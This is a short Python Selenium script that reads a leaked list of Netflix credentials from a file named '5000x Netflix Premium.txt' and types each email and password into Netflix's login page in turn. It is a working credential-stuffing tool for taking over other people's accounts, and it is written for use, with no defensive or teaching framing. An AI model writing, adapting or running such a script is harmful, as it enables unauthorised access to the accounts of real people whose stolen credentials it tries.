import time
import requests
import pandas as pd
#from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import json

def Catch_User(line):
    mail = line.split(' ')
    return mail[len(mail) - 1]

def Try_User(user, password):
    inputUser = driver.find_element_by_name('userLoginId')
    inputPassword = driver.find_element_by_name('password')
    inputUser.clear()
    inputPassword.clear()
    inputUser.send_keys(user)
    inputPassword.send_keys(password)
    time.sleep(5)
    driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/button').click()  
    
    time.sleep(2)

fileName = '5000x Netflix Premium.txt'
file = open(fileName, 'r', encoding="utf8")

url = 'https://www.netflix.com/br/login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse'

option = Options()
option.headless = True
driver = webdriver.Chrome("chromedriver.exe")

driver.get(url)
time.sleep(4)

while True:
    line = file.readline()
    if line.startswith('║ Mail :'):
        mail = Catch_User(line)
    if line.startswith('║ Şifre :'):
        password = Catch_User(line)
        Try_User(mail, password)